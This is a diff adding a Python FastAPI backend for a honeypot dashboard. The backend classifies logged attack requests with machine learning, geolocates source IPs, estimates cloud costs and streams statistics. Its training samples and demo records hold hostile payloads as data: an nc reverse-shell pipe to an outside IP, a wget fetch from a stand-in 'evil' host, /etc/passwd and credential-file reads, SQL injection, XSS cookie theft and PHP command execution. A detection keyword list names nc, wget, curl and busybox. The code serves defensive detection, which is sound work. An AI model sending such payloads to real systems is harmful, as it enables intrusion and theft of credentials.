@@ -1,0 +1,726 @@
+import asyncio
+from contextlib import asynccontextmanager
+from datetime import datetime, timedelta, timezone
+import html
+import json
+import logging as std_logging
+import os
+import re
+from typing import Any, AsyncGenerator
+
+from fastapi import FastAPI, Query, Request
+from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import FileResponse, StreamingResponse
+from fastapi.staticfiles import StaticFiles
+from google.cloud import logging as gcp_logging
+import httpx
+import numpy as np
+from sklearn.ensemble import IsolationForest
+from sklearn.feature_extraction.text import TfidfVectorizer
+from sklearn.naive_bayes import MultinomialNB
+from sklearn.pipeline import Pipeline
+
+logger = std_logging.getLogger("honeypot-dashboard")
+
+# ==========================================
+# 設定・定数（学習・検証用：マスク・除外オフ）
+# ==========================================
+GCP_PROJECT_ID = os.getenv("GCP_PROJECT_ID", "honeypot-515503")
+LOG_SOURCE_PROJECT_ID = os.getenv("LOG_SOURCE_PROJECT_ID", GCP_PROJECT_ID)
+USD_TO_JPY = float(os.getenv("USD_TO_JPY", "152.0"))
+STREAM_INTERVAL_SEC = float(os.getenv("STREAM_INTERVAL_SEC", "3.0"))
+
+SKIP_CRAWLERS = os.getenv("SKIP_CRAWLERS", "false").lower() == "true"
+SKIP_SYSTEM_NOISE = os.getenv("SKIP_SYSTEM_NOISE", "false").lower() == "true"
+
+GEO_CACHE: dict[str, dict[str, Any]] = {}
+
+COUNTRY_JA_MAP: dict[str, str] = {
+    "US": "アメリカ",
+    "CN": "中国",
+    "RU": "ロシア",
+    "IN": "インド",
+    "BR": "ブラジル",
+    "DE": "ドイツ",
+    "NL": "オランダ",
+    "SG": "シンガポール",
+    "JP": "日本",
+    "KR": "韓国",
+    "GB": "イギリス",
+    "FR": "フランス",
+    "VN": "ベトナム",
+    "ID": "インドネシア",
+    "ZA": "南アフリカ",
+    "BE": "ベルギー",
+    "HK": "香港",
+    "TW": "台湾",
+    "CA": "カナダ",
+    "AU": "オーストラリア",
+    "UA": "ウクライナ",
+}
+
+CRAWLER_UA_KEYWORDS = (
+    "googlebot",
+    "google-lens",
+    "bingbot",
+    "yandexbot",
+    "duckduckbot",
+    "baiduspider",
+    "slurp",
+    "applebot",
+    "uptime",
+    "googlehc",
+)
+
+SYSTEM_NOISE_PATTERNS = (
+    "gce agent stopped",
+    "error watching metadata",
+    "no shutdown scripts to run",
+    "starting shutdown scripts",
+    "completed adding/removing routes",
+    "network interface setup disabled",
+    "systemd-",
+    "dhclient",
+    "cloud-init",
+)
+
+# ==========================================
+# 機械学習モデル（Naive Bayes + Isolation Forest）
+# ==========================================
+CLASSIFIER_PIPELINE: Pipeline | None = None
+ANOMALY_MODEL: IsolationForest | None = None
+
+
+def init_ml_models() -> None:
+    """攻撃種別分類（MultinomialNB）と異常検知（IsolationForest）を初期化・学習"""
+    global CLASSIFIER_PIPELINE, ANOMALY_MODEL
+
+    train_samples = [
+        ("POST /boaform/admin/formSysCmd nc 45.90.163.37 4545 | sh", "RCE / Command Injection"),
+        ("POST /cgi-bin/luci/;stok=/locale cmd=wget http://evil/sh", "RCE / Command Injection"),
+        ("GET /shell?cmd=cat+/etc/passwd;+uname+-a", "RCE / Command Injection"),
+        ("POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <?php system('id'); ?>", "RCE / Command Injection"),
+        ("GET /boaform/admin/formPing?target_addr=127.0.0.1|busybox", "RCE / Command Injection"),
+        ("GET /.env HTTP/1.1", "Credential / Env Theft"),
+        ("GET /.git/config HTTP/1.1", "Credential / Env Theft"),
+        ("GET /config.json aws_secret_access_key", "Credential / Env Theft"),
+        ("GET /backup.sql.gz db_password", "Credential / Env Theft"),
+        ("GET /aws/credentials .ssh/id_rsa", "Credential / Env Theft"),
+        ("POST /wp-login.php log=admin&pwd=password123", "CMS / Admin Brute Force"),
+        ("GET /xmlrpc.php wp.getUsersBlogs", "CMS / Admin Brute Force"),
+        ("GET /phpmyadmin/index.php", "CMS / Admin Brute Force"),
+        ("POST /admin/login username=root&password=admin", "CMS / Admin Brute Force"),
+        ("GET /search?id=1' UNION SELECT 1,user(),database()--", "SQLi / XSS Probe"),
+        ("GET /index.php?page=1 OR 1=1", "SQLi / XSS Probe"),
+        ("GET /?q=<script>alert(document.cookie)</script>", "SQLi / XSS Probe"),
+        ("GET /../../../../etc/passwd", "SQLi / XSS Probe"),
+        ("GET / cortex-xpanse scanning-activity", "Automated Recon / Scanner"),
+        ("GET / mglndd bad_request 400", "Automated Recon / Scanner"),
+        ("GET /robots.txt python-requests/2.31.0", "Automated Recon / Scanner"),
+        ("GET /favicon.ico zgrab/0.x", "Automated Recon / Scanner"),
+        ("GET /sitemap.xml masscan/1.3", "Automated Recon / Scanner"),
+        ("HEAD / HTTP/1.1 nuclei", "Automated Recon / Scanner"),
+    ]
+
+    texts = [x[0] for x in train_samples]
+    labels = [x[1] for x in train_samples]
+
+    pipeline = Pipeline(
+        [
+            ("tfidf", TfidfVectorizer(ngram_range=(1, 2), lowercase=True)),
+            ("nb", MultinomialNB(alpha=0.3)),
+        ]
+    )
+    pipeline.fit(texts, labels)
+    CLASSIFIER_PIPELINE = pipeline
+
+    baseline_features = np.array(
+        [
+            [12, 0, 5, 1],
+            [18, 20, 6, 2],
+            [10, 0, 4, 1],
+            [24, 45, 7, 3],
+            [15, 10, 5, 2],
+            [30, 60, 8, 4],
+            [14, 5, 5, 1],
+            [22, 30, 6, 2],
+        ],
+        dtype=np.float64,
+    )
+    detector = IsolationForest(n_estimators=100, contamination=0.15, random_state=42)
+    detector.fit(baseline_features)
+    ANOMALY_MODEL = detector
+
+
+def _get_ready_models() -> tuple[Pipeline, IsolationForest]:
+    if CLASSIFIER_PIPELINE is None or ANOMALY_MODEL is None:
+        init_ml_models()
+    assert CLASSIFIER_PIPELINE is not None
+    assert ANOMALY_MODEL is not None
+    return CLASSIFIER_PIPELINE, ANOMALY_MODEL
+
+
+def classify_and_score(
+    event_type: str,
+    method: str,
+    path: str,
+    payload: str,
+    user_agent: str,
+    raw_request_line: str = "",
+    header_count: int = 6,
+) -> tuple[str, float, int]:
+    """攻撃カテゴリ・確信度・AI異常度スコア（0〜100%）を算出"""
+    classifier, detector = _get_ready_models()
+
+    signal_text = f"{event_type} {method} {path} {payload} {raw_request_line} {user_agent}".strip()
+    probs = classifier.predict_proba([signal_text])[0]
+    classes = classifier.classes_
+    best_idx = int(np.argmax(probs))
+    category = str(classes[best_idx])
+    confidence = round(float(probs[best_idx]) * 100.0, 1)
+
+    lower_sig = signal_text.lower()
+    if any(k in lower_sig for k in ("formsyscmd", "nc ", "|sh", "| sh", "wget ", "curl ", "busybox", "/etc/passwd")):
+        category = "RCE / Command Injection"
+        confidence = max(confidence, 88.0)
+    elif event_type == "bad_request" or "xpanse" in lower_sig or "mglndd" in lower_sig:
+        if category == "Credential / Env Theft":
+            category = "Automated Recon / Scanner"
+
+    special_chars = len(re.findall(r"['\";|<>$`\\{}\[\]\.\./]", f"{path} {payload} {raw_request_line}"))
+    features = np.array(
+        [[len(path), len(payload), max(0, header_count), special_chars]],
+        dtype=np.float64,
+    )
+    raw_score = float(detector.decision_function(features)[0])
+    anomaly_pct = int(np.clip((0.35 - raw_score) * 140.0, 5, 99))
+    if event_type == "bad_request" or category == "RCE / Command Injection":
+        anomaly_pct = max(anomaly_pct, 78)
+
+    return category, confidence, anomaly_pct
+
+
+# ==========================================
+# GeoIP バッチ解決（ip-api.com）
+# ==========================================
+def code_to_flag(country_code: str) -> str:
+    code = (country_code or "").strip().upper()
+    if len(code) != 2 or not code.isalpha():
+        return "🌐"
+    return "".join(chr(127397 + ord(c)) for c in code)
+
+
+def is_public_ipv4(ip: str) -> bool:
+    if not ip or ip in {"127.0.0.1", "0.0.0.0", "unknown"}:
+        return False
+    if ip.startswith(("10.", "192.168.", "169.254.")):
+        return False
+    if ip.startswith("172."):
+        parts = ip.split(".")
+        if len(parts) >= 2 and parts[1].isdigit() and 16 <= int(parts[1]) <= 31:
+            return False
+    return True
+
+
+async def resolve_geoip_batch(ips: list[str]) -> dict[str, dict[str, Any]]:
+    """未キャッシュのIPを ip-api.com/batch で最大100件ずつ一括解決"""
+    unique_ips = list(dict.fromkeys(ips))
+    uncached = [ip for ip in unique_ips if ip not in GEO_CACHE and is_public_ipv4(ip)]
+
+    for ip in unique_ips:
+        if ip not in GEO_CACHE and not is_public_ipv4(ip):
+            GEO_CACHE[ip] = {
+                "country": "Private / Local",
+                "country_ja": "ローカル",
+                "country_code": "",
+                "flag": "🏠",
+                "lat": 35.68,
+                "lon": 139.76,
+                "isp": "Internal Network",
+            }
+
+    if uncached:
+        batches = [uncached[i : i + 100] for i in range(0, len(uncached), 100)]
+        async with httpx.AsyncClient(timeout=8.0) as client:
+            for batch in batches:
+                req_body = [
+                    {
+                        "query": ip,
+                        "fields": "status,country,countryCode,lat,lon,isp,query",
+                    }
+                    for ip in batch
+                ]
+                try:
+                    resp = await client.post("http://ip-api.com/batch", json=req_body)
+                    resp.raise_for_status()
+                    items = resp.json()
+                    if isinstance(items, list):
+                        for item in items:
+                            q_ip = item.get("query")
+                            if not q_ip:
+                                continue
+                            if item.get("status") == "success":
+                                cc = item.get("countryCode", "")
+                                en_name = item.get("country") or "Unknown"
+                                ja_name = COUNTRY_JA_MAP.get(cc, en_name)
+                                GEO_CACHE[q_ip] = {
+                                    "country": en_name,
+                                    "country_ja": ja_name,
+                                    "country_code": cc,
+                                    "flag": code_to_flag(cc),
+                                    "lat": float(item.get("lat", 0.0)),
+                                    "lon": float(item.get("lon", 0.0)),
+                                    "isp": item.get("isp") or "Unknown ISP",
+                                }
+                except httpx.HTTPError as exc:
+                    logger.warning("GeoIP batch lookup failed: %s", exc)
+
+        for ip in uncached:
+            if ip not in GEO_CACHE:
+                GEO_CACHE[ip] = {
+                    "country": "Unknown",
+                    "country_ja": "不明",
+                    "country_code": "",
+                    "flag": "🌐",
+                    "lat": 0.0,
+                    "lon": 0.0,
+                    "isp": "Unknown ISP",
+                }
+
+    return {ip: GEO_CACHE[ip] for ip in unique_ips if ip in GEO_CACHE}
+
+
+# ==========================================
+# ログパース・整形 & Cloud Logging 取得
+# ==========================================
+def format_raw_for_study(text: str, max_len: int = 1200) -> str:
+    cleaned = text or ""
+    return html.escape(cleaned[:max_len])
+
+
+def _extract_user_agent(data: dict[str, Any], http_req: dict[str, Any]) -> str:
+    if data.get("user_agent"):
+        return str(data["user_agent"])
+    headers = data.get("headers")
+    if isinstance(headers, dict):
+        for k, v in headers.items():
+            if str(k).lower() == "user-agent":
+                if isinstance(v, list) and v:
+                    return str(v[0])
+                return str(v or "")
+    req_meta = data.get("requestMetadata")
+    if isinstance(req_meta, dict) and req_meta.get("callerSuppliedUserAgent"):
+        return str(req_meta["callerSuppliedUserAgent"])
+    if http_req.get("userAgent"):
+        return str(http_req["userAgent"])
+    return ""
+
+
+def _parse_json_dict(raw_val: Any) -> dict[str, Any] | None:
+    if isinstance(raw_val, dict):
+        return raw_val
+    if isinstance(raw_val, str):
+        stripped = raw_val.strip()
+        if stripped.startswith("{") and stripped.endswith("}"):
+            try:
+                parsed = json.loads(stripped)
+                if isinstance(parsed, dict):
+                    return parsed
+            except json.JSONDecodeError:
+                return None
+    return None
+
+
+def _should_skip_record(
+    event_type: str,
+    user_agent: str,
+    path: str,
+    raw_text: str,
+) -> bool:
+    lower_text = raw_text.lower()
+    ua_lower = user_agent.lower()
+
+    if SKIP_SYSTEM_NOISE:
+        if event_type == "heartbeat":
+            return True
+        if any(pat in lower_text for pat in SYSTEM_NOISE_PATTERNS):
+            return True
+
+    if SKIP_CRAWLERS:
+        if any(kw in ua_lower for kw in CRAWLER_UA_KEYWORDS):
+            return True
+        if path in {"/healthz", "/favicon.ico"} and not ua_lower and event_type != "bad_request":
+            return True
+
+    return False
+
+
+def _extract_ip_from_dict(d: dict[str, Any], http_req: dict[str, Any]) -> str:
+    for key in ("src_ip", "remote_ip", "client_ip", "ip"):
+        val = d.get(key)
+        if val and str(val).strip() not in {"", "0.0.0.0", "unknown"}:
+            return str(val).strip()
+
+    req_meta = d.get("requestMetadata")
+    if isinstance(req_meta, dict):
+        caller_ip = req_meta.get("callerIp")
+        if caller_ip and str(caller_ip).strip() not in {"", "0.0.0.0", "unknown"}:
+            return str(caller_ip).strip()
+
+    http_ip = http_req.get("remoteIp")
+    if http_ip and str(http_ip).strip() not in {"", "0.0.0.0", "unknown"}:
+        return str(http_ip).strip()
+
+    return "0.0.0.0"
+
+
+def _fetch_gcp_entries_sync(hours: int, limit: int) -> list[dict[str, Any]]:
+    client = gcp_logging.Client(project=LOG_SOURCE_PROJECT_ID)
+    since = (datetime.now(timezone.utc) - timedelta(hours=hours)).strftime("%Y-%m-%dT%H:%M:%SZ")
+    log_filter = f'timestamp >= "{since}"'
+
+    scan_limit = min(max(limit * 5, 300), 2000)
+    entries = client.list_entries(
+        filter_=log_filter,
+        order_by=gcp_logging.DESCENDING,
+        max_results=scan_limit,
+    )
+
+    records: list[dict[str, Any]] = []
+    for entry in entries:
+        payload_raw = entry.payload
+        http_req = entry.http_request or {}
+        outer_dict = _parse_json_dict(payload_raw)
+
+        if outer_dict is not None:
+            inner_dict = _parse_json_dict(outer_dict.get("message"))
+            target_dict = inner_dict if inner_dict is not None else outer_dict
+
+            src_ip = _extract_ip_from_dict(target_dict, http_req)
+            if src_ip == "0.0.0.0" and target_dict is not outer_dict:
+                src_ip = _extract_ip_from_dict(outer_dict, http_req)
+
+            event_type = str(
+                target_dict.get("event")
+                or outer_dict.get("event")
+                or outer_dict.get("methodName")
+                or "request"
+            ).lower()
+            method = str(target_dict.get("method") or http_req.get("requestMethod") or "GET")
+            path = str(target_dict.get("path") or http_req.get("requestUrl") or "/")
+            raw_req_line = str(target_dict.get("raw_request_line") or "").strip()
+            body_val = target_dict.get("payload") or target_dict.get("body") or ""
+            headers_obj = target_dict.get("headers")
+
+            full_json_str = json.dumps(target_dict, ensure_ascii=False)
+            if raw_req_line or body_val:
+                parts = [p for p in (raw_req_line, str(body_val) if body_val else "") if p]
+                payload_str = f"{' | '.join(parts)} || RAW: {full_json_str}"
+            else:
+                payload_str = full_json_str
+
+            ua = _extract_user_agent(target_dict, http_req) or _extract_user_agent(outer_dict, http_req)
+            header_cnt = (
+                len(headers_obj)
+                if isinstance(headers_obj, dict)
+                else int(target_dict.get("header_count", 6))
+            )
+            raw_text_for_filter = f"{event_type} {path} {payload_str} {ua}"
+        else:
+            event_type = "text"
+            src_ip = _extract_ip_from_dict({}, http_req)
+            method = str(http_req.get("requestMethod") or "GET")
+            path = str(http_req.get("requestUrl") or "/")
+            raw_req_line = ""
+            payload_str = str(payload_raw or "")
+            ua = str(http_req.get("userAgent") or "")
+            header_cnt = 6
+            raw_text_for_filter = f"{path} {payload_str} {ua}"
+
+        if _should_skip_record(event_type, ua, path, raw_text_for_filter):
+            continue
+
+        ts = entry.timestamp.isoformat() if entry.timestamp else datetime.now(timezone.utc).isoformat()
+        byte_size = len(raw_text_for_filter.encode("utf-8")) + 160
+
+        records.append(
+            {
+                "timestamp": ts,
+                "event_type": event_type,
+                "ip": src_ip,
+                "method": method,
+                "path": path,
+                "payload": payload_str,
+                "raw_request_line": raw_req_line,
+                "user_agent": ua,
+                "header_count": header_cnt,
+                "bytes": byte_size,
+            }
+        )
+
+        if len(records) >= limit:
+            break
+
+    return records
+
+
+def _generate_fallback_records() -> list[dict[str, Any]]:
+    now = datetime.now(timezone.utc)
+    samples = [
+        ("request", "103.21.244.10", "POST", "/boaform/admin/formSysCmd", "nc 45.90.163.37 4545|sh", "curl/7.88.1", 5),
+        ("request", "177.54.148.12", "POST", "/boaform/admin/formSysCmd", "nc 45.90.163.37 4545|sh", "Wget/1.21", 5),
+        ("bad_request", "20.150.195.48", "GET", "/", "MGLNDD_34.171.110.164_80", "", 0),
+        ("request", "198.235.24.32", "GET", "/", "Cortex-Xpanse Scanning", "Hello from Palo Alto Networks Cortex-Xpanse", 4),
+    ]
+    out: list[dict[str, Any]] = []
+    for idx, (ev_type, ip, method, path, payload, ua, h_cnt) in enumerate(samples):
+        ts = (now - timedelta(minutes=idx * 15)).isoformat()
+        out.append(
+            {
+                "timestamp": ts,
+                "event_type": ev_type,
+                "ip": ip,
+                "method": method,
+                "path": path,
+                "payload": payload,
+                "raw_request_line": "",
+                "user_agent": ua,
+                "header_count": h_cnt,
+                "bytes": 420 + len(payload),
+            }
+        )
+    return out
+
+
+async def fetch_logs_async(hours: int, limit: int) -> tuple[list[dict[str, Any]], bool]:
+    try:
+        records = await asyncio.to_thread(_fetch_gcp_entries_sync, hours, limit)
+        if not records:
+            return _generate_fallback_records(), True
+        return records, False
+    except Exception as exc:
+        logger.warning("Falling back to sample logs due to Cloud Logging error: %s", exc)
+        return _generate_fallback_records(), True
+
+
+# ==========================================
+# GCP コスト計算（無料枠考慮）
+# ==========================================
+def calculate_gcp_costs(log_count: int, total_bytes: int, hours: int) -> dict[str, Any]:
+    scale_to_month = (24.0 * 30.0) / max(hours, 1)
+    est_monthly_bytes = total_bytes * scale_to_month
+    est_monthly_reqs = log_count * scale_to_month
+
+    free_logging_bytes = 50 * (1024**3)
+    billable_gib = max(0.0, (est_monthly_bytes - free_logging_bytes) / (1024**3))
+    logging_usd = billable_gib * 0.50
+    logging_quota_pct = min(100.0, round((est_monthly_bytes / free_logging_bytes) * 100.0, 2))
+
+    free_run_reqs = 2_000_000
+    billable_reqs = max(0.0, est_monthly_reqs - free_run_reqs)
+    run_usd = (billable_reqs / 1_000_000) * 0.40
+    run_quota_pct = min(100.0, round((est_monthly_reqs / free_run_reqs) * 100.0, 2))
+
+    total_usd = round(logging_usd + run_usd, 4)
+    total_jpy = round(total_usd * USD_TO_JPY, 1)
+
+    return {
+        "estimated_monthly_usd": total_usd,
+        "estimated_monthly_jpy": total_jpy,
+        "logging_free_tier_pct": logging_quota_pct,
+        "cloud_run_free_tier_pct": run_quota_pct,
+        "analyzed_bytes": total_bytes,
+    }
+
+
+async def build_stats_payload(hours: int, limit: int) -> dict[str, Any]:
+    """集計・ML推論・GeoIP解決をまとめたペイロード生成関数（REST / SSE 共用）"""
+    raw_records, is_demo_mode = await fetch_logs_async(hours=hours, limit=limit)
+    ips = [r["ip"] for r in raw_records]
+    geo_map = await resolve_geoip_batch(ips)
+
+    category_counts: dict[str, int] = {}
+    country_counts: dict[str, dict[str, Any]] = {}
+    ip_counts: dict[str, dict[str, Any]] = {}
+    timeline_events: list[dict[str, Any]] = []
+    map_points_dict: dict[str, dict[str, Any]] = {}
+
+    total_bytes = 0
+    high_anomaly_count = 0
+
+    for rec in raw_records:
+        total_bytes += rec["bytes"]
+        ip = rec["ip"]
+        geo = geo_map.get(
+            ip,
+            {
+                "country": "Unknown",
+                "country_ja": "不明",
+                "country_code": "",
+                "flag": "🌐",
+                "lat": 0.0,
+                "lon": 0.0,
+                "isp": "Unknown",
+            },
+        )
+
+        category, confidence, anomaly_score = classify_and_score(
+            event_type=rec.get("event_type", "request"),
+            method=rec["method"],
+            path=rec["path"],
+            payload=rec["payload"],
+            user_agent=rec["user_agent"],
+            raw_request_line=rec.get("raw_request_line", ""),
+            header_count=rec["header_count"],
+        )
+        if anomaly_score >= 75:
+            high_anomaly_count += 1
+
+        category_counts[category] = category_counts.get(category, 0) + 1
+
+        c_key = f"{geo['flag']} {geo['country_ja']} ({geo['country']})"
+        if c_key not in country_counts:
+            country_counts[c_key] = {
+                "label": c_key,
+                "flag": geo["flag"],
+                "country": geo["country_ja"],
+                "count": 0,
+            }
+        country_counts[c_key]["count"] += 1
+
+        if ip not in ip_counts:
+            ip_counts[ip] = {
+                "ip": ip,
+                "flag": geo["flag"],
+                "country": geo["country_ja"],
+                "isp": geo["isp"],
+                "count": 0,
+                "top_category": category,
+            }
+        ip_counts[ip]["count"] += 1
+
+        if geo["lat"] != 0.0 or geo["lon"] != 0.0:
+            if ip not in map_points_dict:
+                map_points_dict[ip] = {
+                    "ip": ip,
+                    "lat": geo["lat"],
+                    "lon": geo["lon"],
+                    "flag": geo["flag"],
+                    "country": geo["country_ja"],
+                    "isp": geo["isp"],
+                    "count": 0,
+                    "category": category,
+                }
+            map_points_dict[ip]["count"] += 1
+
+        timeline_events.append(
+            {
+                "id": f"{rec['timestamp']}_{ip}_{rec['method']}_{rec['path']}",
+                "timestamp": rec["timestamp"],
+                "ip": ip,
+                "flag": geo["flag"],
+                "country": geo["country_ja"],
+                "isp": geo["isp"],
+                "method": rec["method"],
+                "path": format_raw_for_study(rec["path"], max_len=500),
+                "payload": format_raw_for_study(rec["payload"], max_len=1200),
+                "category": category,
+                "confidence": confidence,
+                "anomaly_score": anomaly_score,
+            }
+        )
+
+    top_countries = sorted(country_counts.values(), key=lambda x: x["count"], reverse=True)[:10]
+    top_ips = sorted(ip_counts.values(), key=lambda x: x["count"], reverse=True)[:10]
+    cost_info = calculate_gcp_costs(len(raw_records), total_bytes, hours)
+
+    return {
+        "updated_at": datetime.now(timezone.utc).isoformat(),
+        "is_demo_mode": is_demo_mode,
+        "summary": {
+            "total_attacks": len(raw_records),
+            "unique_ips": len(ip_counts),
+            "unique_countries": len(country_counts),
+            "high_anomaly_count": high_anomaly_count,
+        },
+        "categories": category_counts,
+        "top_countries": top_countries,
+        "top_ips": top_ips,
+        "map_points": list(map_points_dict.values()),
+        "timeline": timeline_events,
+        "cost": cost_info,
+    }
+
+
+# ==========================================
+# FastAPI アプリケーション（REST + SSE リアルタイム配信）
+# ==========================================
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    init_ml_models()
+    yield
+
+
+app = FastAPI(title="Honeypot Threat Intelligence Dashboard (Realtime)", lifespan=lifespan)
+
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
+STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static")
+if os.path.isdir(STATIC_DIR):
+    app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
+
+
+@app.get("/")
+async def serve_index() -> FileResponse:
+    return FileResponse(os.path.join(STATIC_DIR, "index.html"))
+
+
+@app.get("/api/stats")
+async def get_stats(
+    hours: int = Query(default=24, ge=1, le=720),
+    limit: int = Query(default=200, ge=10, le=1000),
+) -> dict[str, Any]:
+    return await build_stats_payload(hours=hours, limit=limit)
+
+
+@app.get("/api/stream")
+async def stream_stats(
+    request: Request,
+    hours: int = Query(default=24, ge=1, le=720),
+    limit: int = Query(default=200, ge=10, le=1000),
+) -> StreamingResponse:
+    """Server-Sent Events (SSE) によるリアルタイムストリーミング配信"""
+
+    async def event_generator() -> AsyncGenerator[str, None]:
+        while True:
+            if await request.is_disconnected():
+                break
+            try:
+                payload = await build_stats_payload(hours=hours, limit=limit)
+                data_json = json.dumps(payload, ensure_ascii=False)
+                yield f"event: stats\ndata: {data_json}\n\n"
+            except Exception as exc:
+                err_json = json.dumps({"error": str(exc)}, ensure_ascii=False)
+                yield f"event: error\ndata: {err_json}\n\n"
+
+            await asyncio.sleep(STREAM_INTERVAL_SEC)
+
+    return StreamingResponse(
+        event_generator(),
+        media_type="text/event-stream",
+        headers={
+            "Cache-Control": "no-cache",
+            "Connection": "keep-alive",
+            "X-Accel-Buffering": "no",
+        },
+    )
+
+@app.get("/environment")
+@app.get("/environment.html")
+async def serve_environment() -> FileResponse:
+    return FileResponse(os.path.join(STATIC_DIR, "environment.html"))
